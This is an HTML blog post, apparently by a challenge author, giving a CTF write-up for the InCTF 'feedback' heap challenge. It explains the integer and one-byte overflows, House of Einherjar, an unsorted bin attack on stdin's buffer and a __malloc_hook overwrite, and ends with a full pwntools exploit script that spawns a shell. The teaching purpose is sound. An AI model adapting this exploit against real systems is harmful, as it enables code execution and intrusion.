@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+    <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1">
+    <meta name=viewport content="width=device-width, initial-scale=1">
+    <title>InCTF: feedback Writeup &#8211; sherl0ck's home</title>
+    <meta name="description" content="Unsorted bin attack on stdin’s _IO_buf_base">
+    <meta name="keywords" content="writeup, unsortedbin, heap, filestructure">
+    <link rel="canonical" href="http://localhost:4000/2016-10-12-feedback/">
+        <!-- Twitter Cards -->
+    <meta name="twitter:title" content="InCTF: feedback Writeup">
+    <meta name="twitter:description" content="Unsorted bin attack on stdin’s _IO_buf_base">
+    <meta name="twitter:site" content="@sherl0ck__">
+    <meta name="twitter:creator" content="@sherl0ck__">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:image" content="http://localhost:4000/assets/img/profile.png">
+    <!-- Open Graph -->
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="InCTF: feedback Writeup">
+    <meta property="og:description" content="Unsorted bin attack on stdin’s _IO_buf_base">
+    <meta property="og:url" content="http://localhost:4000/2016-10-12-feedback/">
+    <meta property="og:site_name" content="sherl0ck's home">
+    <meta property="og:image" content="http://localhost:4000/assets/img/profile.png">
+
+    
+    
+    <!-- Handheld -->
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Favicons -->
+    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-57x57.png" />
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-114x114.png" />
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-72x72.png" />
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/assets/img/favicon/apple-touch-icon-144x144.png" />
+<link rel="icon" type="image/png" href="http://localhost:4000/assets/img/favicon/favicon.png" />
+<link rel="shortcut icon" href="http://localhost:4000/assets/img/favicon/favicon.png" />
+
+    <!-- Feed -->
+    <link rel="alternate" type="application/rss+xml" title="sherl0ck's home" href="http://localhost:4000/feed.xml" />
+    <!-- CSS -->
+    <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css">
+</head>
+
+  <body>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script type="text/javascript">
+      $(function() {
+        i = 0;
+        $('.menuAc').css({
+          'color': 'rgba(52, 152, 219, 1)'
+        });
+        $('.menuAc').click(function(){
+          $(this).next('.menuMobil').animate({width:'toggle'},350);
+          if (i%2==0) {
+            $('.footer').css({
+              'filter'         : 'blur(5px)'
+            });
+            $('.yazilar').css({
+              'filter'         : 'blur(5px)'
+            });
+            $('.ust').css({
+              'filter'         : 'blur(5px)'
+            });
+            $('ul.menu').css({
+              'animation-duration': '0.1s'
+            });
+            i++;
+          }
+          else {
+            $('.footer').css({
+              'filter'         : 'blur(0px)'
+            });
+            $('.yazilar').css({
+              'filter'         : 'blur(0px)'
+            });
+            $('.ust').css({
+              'filter'         : 'blur(0px)'
+            });
+            i++;
+          }
+
+        });
+      });
+    </script>
+
+    <div class="menuAc">
+      <i class="fa fa-bars" aria-hidden="true"></i>
+    </div>
+    <div class="menuMobil">
+          <nav class="nav-home">
+      <ul class="menu">
+            
+				    
+				    <li><a class="link" href="http://localhost:4000/" >Home</a></li>
+				
+				    
+				    <li><a class="link" href="http://localhost:4000/blog/" >Blog</a></li>
+				
+				    
+				    <li><a class="link" href="http://localhost:4000/projects/" >Projects</a></li>
+				
+				    
+				    <li><a class="link" href="http://localhost:4000/about/" >About</a></li>
+				
+				    
+				    <li><a class="link" href="http://localhost:4000/resume.pdf" >Resume</a></li>
+				
+        </ul>
+    </nav>
+
+    </div>
+    <div class="ust">
+      <div class="ortalaAna">
+        <div class="baslikAna">
+          sherl0ck's home
+        </div>
+
+        <div class="pc">
+              <nav class="nav">
+        <ul class="menuAna">
+            
+				    
+				    <li class="item"><a class="link" href="http://localhost:4000/" >Home</a></li>
+				
+				    
+				    <li class="item"><a class="link" href="http://localhost:4000/blog/" >Blog</a></li>
+				
+				    
+				    <li class="item"><a class="link" href="http://localhost:4000/projects/" >Projects</a></li>
+				
+				    
+				    <li class="item"><a class="link" href="http://localhost:4000/about/" >About</a></li>
+				
+				    
+				    <li class="item"><a class="link" href="http://localhost:4000/resume.pdf" >Resume</a></li>
+				
+        </ul>
+    </nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="ortalaAna">
+      <div class="yazilar">
+        <div class="yazi">
+          <div class="ustr">
+            <h2>InCTF: feedback Writeup</h2>
+            <div class="yazibilgisi">
+              12 Oct 2018
+            </div>
+
+          </div>
+          <hr>
+          <div class="content">
+            <div class="entry">
+            <div class=".post-tag">
+              
+              <i class="fa fa-tags" float=right></i>
+              
+              <a href="/blog/tag/#writeup"   class="post-tag">writeup</a>
+              
+              <a href="/blog/tag/#unsortedbin"   class="post-tag">unsortedbin</a>
+              
+              <a href="/blog/tag/#heap"   class="post-tag">heap</a>
+              
+              <a href="/blog/tag/#filestructure"   class="post-tag">filestructure</a>
+              
+              
+            </div>
+            <p><b>Attachments</b>: <a href="/assets/img/feedback/feedback">binary</a>     <a href="/assets/img/feedback/">libc</a>     <a href="/assets/img/feedback/feedback.c">source</a></p>
+
+<p>The binary is a non-stripped ELF 64 bit file. It is basically a kind of feedback accepting mechanism. Lets start with the permissions if the binary.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nx">gdb</span><span class="o">-</span><span class="nx">peda$</span> <span class="nx">checksec</span>
+    <span class="nx">CANARY</span>    <span class="p">:</span> <span class="nx">ENABLED</span>
+    <span class="nx">FORTIFY</span>   <span class="p">:</span> <span class="nx">disabled</span>
+    <span class="nx">NX</span>        <span class="p">:</span> <span class="nx">ENABLED</span>
+    <span class="nx">PIE</span>       <span class="p">:</span> <span class="nx">ENABLED</span>
+    <span class="nx">RELRO</span>     <span class="p">:</span> <span class="nx">FULL</span>
+</code></pre></div></div>
+
+<p>And pretty much everything is enabled. Lets take a quick review of what all this binary is doing.</p>
+
+<h2 id="reversing">Reversing</h2>
+
+<p>Overview: This binary takes in ‘feedback’. We can create 4 drafts and also leave our name. We can ‘save’ only one of the drafts. After saving the draft, we have to provide some details and then are prompted to fill up a captcha.</p>
+
+<p>I’ve added the source code along this post. So you can quickly go through that. Here’s a overview of the major functionalities.</p>
+
+<ul>
+  <li>
+    <p><u>update_name</u> : This function is for creating/updating the <code class="highlighter-rouge">name</code>. In the first call, it mallocs a chunk of size 132 and allows us to write into the chunk. For all subsequent allocations, we can edit this chunk.</p>
+  </li>
+  <li><u>add_draft</u> : So, there’s this global array named <code class="highlighter-rouge">table</code> which can hold objects of the following structures -
+    <pre><code class="language-C">      typedef struct draft {
+          char title[32];
+          unsigned long size;
+          char *feedback;
+      };
+</code></pre>
+    <p><code class="highlighter-rouge">feedback</code> is a malloced chunk whose size we control. For size &gt; 0x500, 0x500 is set as size and for &lt; 0x80, 0x80 is set as the size.</p>
+  </li>
+  <li>
+    <p><u>View</u> : allows us to view the details of the elements of the <code class="highlighter-rouge">table</code> array.</p>
+  </li>
+  <li>
+    <p><u>Create feedback</u> : It opens the file <code class="highlighter-rouge">/home/feedback/ctffeedback</code> and assigns the files stream pointer to a global variable <code class="highlighter-rouge">fp</code>.</p>
+  </li>
+  <li>
+    <p><u>Save Draft</u> : Asks for the draft id to save and then writes the contents of that draft to the file and frees the draft. Then mallocs a chunk of size 0x3c8 - 0x350 is for the team name and rest for the description. Finally it calls <code class="highlighter-rouge">terminate</code></p>
+  </li>
+  <li><u>terminate</u> : Generates a captcha and asks the user to confirm and then frees the <code class="highlighter-rouge">name</code> chunk and calls <code class="highlighter-rouge">exit</code>.</li>
+</ul>
+
+<h2 id="vulnerability">Vulnerability</h2>
+
+<p>So there are 2 vulnerabilities. An integer overflow in <code class="highlighter-rouge">add</code> and a  one-byte-overflow in the <code class="highlighter-rouge">update_name</code> function. In <code class="highlighter-rouge">add</code>, if we give the size as a negative integer then it mallocs 0x80 but proceeds to write the negative value into the structure object. In the <code class="highlighter-rouge">update_name</code> function, while reading user input into the heap chunk, the user is free to imput a byte more than the chunk size. Thus we can control the last byte of the chunk that is immediately after the <code class="highlighter-rouge">name</code> chunk.</p>
+
+<h2 id="memory-leaks">Memory Leaks</h2>
+
+<p>Note that the <code class="highlighter-rouge">size</code> field is 64 bit long, -1 will be saved like 0xffff….(16 times) . Thus when we view the <code class="highlighter-rouge">title</code> we can leak the pointer to feedback chunk in heap. Thus we have a heap leak here.</p>
+
+<p>Getting the libc leak requires a bit of work. We will use that one-byte overflow to null out the last bit of the next chunk, so that when the next chunk is freed, libc will think that the previous chunk is free and try to coleace these 2 chunks. Thus on the next malloc, we can get overlapping chunks and get libc leak. I’ve explained this in more detail in the following section.</p>
+
+<p>## Exploit</p>
+
+<p>After getting a heap leak, and seeing that one-byte overflow, the first thing that comes to the mind is to perform a House of Einherjar. But there are a few obvious problems here. We have a call to malloc alright but the call to free does not come into picture until it’s too late. So let’s find a way to get around this.</p>
+
+<p>First, a quick note about <code class="highlighter-rouge">fopen</code>. <code class="highlighter-rouge">fopen</code> open a new file stream and the space for that is allocated on the heap. While closing this stream, <code class="highlighter-rouge">fclose</code> internally calls <code class="highlighter-rouge">free</code> to destroy the file-structure object. We can use this call to <code class="highlighter-rouge">free</code> to set our House of Einherjar chain rolling.</p>
+
+<p>Lets assume our heap layout looks something like this-</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>          draft1
+         --------
+          draft2
+         --------
+           name
+         --------
+        file-stream
+</code></pre></div></div>
+<p>Now we can use the one-byte overflow to null out the last bit of the file-stream.</p>
+
+<p>So, here comes the question of what we should coalesce our chunk with. Well, we can actually create a fake chunk inside a <code class="highlighter-rouge">draft</code> chunk and coalesce with that. Here we need a bit of math to get the chunk sizes correct.</p>
+
+<p>The save function first frees the draft and then calls <code class="highlighter-rouge">fclose</code>. Lets say that our fake chunk is in <code class="highlighter-rouge">draft1</code> and we choose to <code class="highlighter-rouge">save</code> the same chunk. Thus this chunk is now freed. After this when <code class="highlighter-rouge">fclose</code> is called, the backward coalescing takes place and now this freshly freed chunk lies inside the previously freed <code class="highlighter-rouge">draft1</code> chunk.</p>
+
+<p>Now next, we have a malloc of size 0x3c8 (for team name and description), which will be serviced from the unsorted bin (provided theres a chunk that satisfies the required size). Remember that the <code class="highlighter-rouge">draft1</code> chunk was freed first and it’s currently sitting at the top of the unsorted bin. If the size of this chunk matches the request by malloc, then this will be returned and the rest of the unsorted bin is left untouched. Also assuming that this happens, we have write access into a free chunk (the fake chunk that we created in <code class="highlighter-rouge">draft1</code> before it was freed).</p>
+
+<p>Note that the first 0x350 bytes are for the team name and the rest for the description. And we can enter the team name multiple times (the loop quits only when we say we’re done). Thus, if we craft the fake chunk in such a way that it’s <code class="highlighter-rouge">prev_size</code> and <code class="highlighter-rouge">size</code> fields lie in the <code class="highlighter-rouge">team_name</code> chunk and the <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> pointers lie in the description chunk, then we can leak out the fd (a libc address) by fully filling the <code class="highlighter-rouge">team_name</code> chunk. In the second try, we again set the size of the fake chunk.</p>
+
+<p>After we have the libc leak, things look better. With the description chunk, we can actually overwrite the <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> of the fake chunk, so as to do an unsorted bin attack. Note that, in <code class="highlighter-rouge">terminate</code> a chunk of size 0x40 is being malloced. If we overwrite the <code class="highlighter-rouge">bk</code> pointer of the fake chunk while entering the description, then an unsorted bin attack happens here.</p>
+
+<p>So now the question is - what should be our target for the unsorted bin attack? We only have limited code after this. Notice that the captcha is being read with <code class="highlighter-rouge">scanf</code>. Thus if we target <code class="highlighter-rouge">_IO_buf_end</code> of <code class="highlighter-rouge">stdin</code> for unsorted bin attack, then it’ll be overwritten with a main arena address. So currently, our <code class="highlighter-rouge">stdin</code> buffer is starting from stdin’s <code class="highlighter-rouge">_shortbuf</code> all the way up to the pointer to top chunk. <code class="highlighter-rouge">__malloc_hook</code> lies in this buffer. And now in <code class="highlighter-rouge">scanf</code>, we can write into this buffer and overwrite <code class="highlighter-rouge">__malloc_hook</code> with a one_gadget.</p>
+
+<p>So, where will <code class="highlighter-rouge">__malloc_hook</code> be called? Well, the name gets freed if the captcha is correct, but the issue is that the next chunk of <code class="highlighter-rouge">name</code> (the previously free file-structure object) has it’s last bit set to null. Thus <code class="highlighter-rouge">free</code> assumes that <code class="highlighter-rouge">name</code> is already free and is being double freed and thus <code class="highlighter-rouge">__malloc_hook</code> is called (<code class="highlighter-rouge">__malloc_hook</code> gets called in 2 cases - either on a <code class="highlighter-rouge">malloc</code> call or on double free). And we get a shell….:)</p>
+
+<p>So we just need to get a proper heap layout with chunks of proper sizes, to create our exploit.</p>
+
+<p>Here’s my exploit script</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span><span class="o">=</span><span class="s">'18.224.70.88'</span>
+<span class="n">PORT</span><span class="o">=</span><span class="mi">1337</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./feedback'</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./libc.so"</span><span class="p">})</span>
+
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">opt</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter choice &gt;&gt; "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">leave_name</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">line</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">line</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Name: "</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Enter Name: "</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add_draft</span><span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">feedback</span><span class="p">,</span><span class="n">line</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">line</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter draft title: "</span><span class="p">,</span><span class="n">title</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Enter draft title: "</span><span class="p">,</span><span class="n">title</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter size of draft: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Give your feedback: "</span><span class="p">,</span><span class="n">feedback</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">():</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">():</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">save</span><span class="p">():</span>
+
+    <span class="s">''' libc leak + unsortedbin attack '''</span>
+
+    <span class="n">menu</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter draft id to save: "</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Enter Team Name and Details: "</span><span class="p">,</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x350</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Team: "</span><span class="o">+</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">350</span><span class="p">))</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"A"</span><span class="p">,</span><span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c4b78</span><span class="c">#-0x3c1b58</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Confirm? &lt;y/n&gt;: "</span><span class="p">,</span><span class="s">'n'</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Enter Team Name and Details: "</span><span class="p">,</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x340</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Confirm? &lt;y/n&gt;: "</span><span class="p">,</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Now give us your contact details: "</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3c4910</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">terminate</span><span class="p">():</span>
+
+    <span class="s">''' overwrite malloc hook '''</span>
+
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter this captcha code: "</span><span class="p">)</span>
+    <span class="n">captcha</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">captcha</span><span class="o">+</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3c6790</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="n">signed</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3c49c0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x3c36e0</span><span class="p">)</span><span class="o">+</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x150</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0xf0274</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">getleak</span><span class="p">():</span>
+
+    <span class="s">''' Heap Leak '''</span>
+
+    <span class="n">add_draft</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="s">"AA"</span><span class="p">,</span><span class="n">line</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">view</span><span class="p">()</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Title: "</span><span class="o">+</span><span class="s">"A"</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">heap</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x10</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"heap @ "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
+
+    <span class="s">''' House of Einherjar '''</span>
+
+    <span class="n">add_draft</span><span class="p">(</span><span class="s">"A"</span><span class="p">,</span><span class="mh">0x3c8</span><span class="p">,</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x340</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1a1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x860</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">add_draft</span><span class="p">(</span><span class="s">"A"</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="s">"A"</span><span class="p">)</span>
+    <span class="n">leave_name</span><span class="p">(</span><span class="s">"A"</span><span class="p">)</span>
+    <span class="n">create</span><span class="p">()</span>
+    <span class="n">add_draft</span><span class="p">(</span><span class="s">"A"</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span><span class="p">)</span>
+    <span class="n">leave_name</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">128</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1a0</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="se">\x30</span><span class="s">'</span><span class="p">,</span><span class="n">line</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+    <span class="n">save</span><span class="p">()</span>
+
+    <span class="n">terminate</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
+
+    <span class="n">getleak</span><span class="p">()</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And the flag was</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>InCTF{uns0rt3d_b1n_t0_d3str0y_f33db4ck}
+</code></pre></div></div>
+
+<p>This was our second time hosting an International CTF and I hope you enjoyed the challenges. If anything about this challenge is unclear or you want to leave a actual “feedback” (:P) of our CTF, please fell free to leave a comment.</p>
+
+            <!-- 
+             -->
+            <!-- [ previous](https://github.com/alperenbozkurt/JBlog){: .btn .btn-info} -->
+
+            
+            <div class="PageNavigation">
+              
+              
+            </div>
+            
+            <div style="clear:both"></div>
+          </div>
+         	</div>
+
+        </div>
+        <script src="http://localhost:4000/assets/js/jquery-1.12.2.min.js"></script>
+<script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+    $.goup({
+        trigger: 500,
+        bottomOffset: 10,
+        locationOffset: 20,
+        containerRadius: 0,
+        containerColor: '#fff',
+        arrowColor: '#000',
+        goupSpeed: 'normal'
+    });
+});
+</script>
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  var _gaq = _gaq || [];
+  var pluginUrl =
+ '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+  _gaq.push(['_setAccount', 'UA-123721864-1']);
+  _gaq.push(['_trackPageview']);
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+        
+  <div id="disqus_thread" class="yazi">  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+  /*
+  var disqus_config = function () {
+  this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+  this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+  };
+  */
+  (function() { // DON'T EDIT BELOW THIS LINE
+  var d = document, s = d.createElement('script');
+  s.src = 'https://sherl0ck.disqus.com/embed.js';
+  s.setAttribute('data-timestamp', +new Date());
+  (d.head || d.body).appendChild(s);
+  })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  <script id="dsq-count-scr" src="//sherl0ck.disqus.com/count.js" async></script>
+
+
+      </div>
+    </div>
+
+        <div class="footer">
+      <div class="ortalaAna">
+        <div class="copy">
+          sherl0ck's home © 2018
+        </div>
+        <div class="sosyal">
+                        <div class="social-links">
+                  <a href="mailto:vigneshsrao5@gmail.com" class="author-social" target="_blank"><i class="fa fa-2x fa-envelope-square"></i></a>
+                  <a href="http://twitter.com/sherl0ck__" class="author-social" target="_blank"><i class="fa fa-2x fa-twitter-square"></i></a>
+                  
+                  
+                  <a href="http://linkedin.com/in/vigneshsrao" class="author-social" target="_blank"><i class="fa fa-2x fa-linkedin-square"></i></a>
+                  
+                  
+                  
+                  <a href="http://github.com/vigneshsrao" class="author-social" target="_blank"><i class="fa fa-2x fa-github"></i></a>
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+            </div>
+
+        </div>
+      </div>
+    </div>
+
+  </body>
+</html>
+
+<!-- 
+<li class="previous disabled"><a>&larr; Previous</a></li>
+
+
+<li class="next disabled"><a>Next &rarr;</a>
+ -->
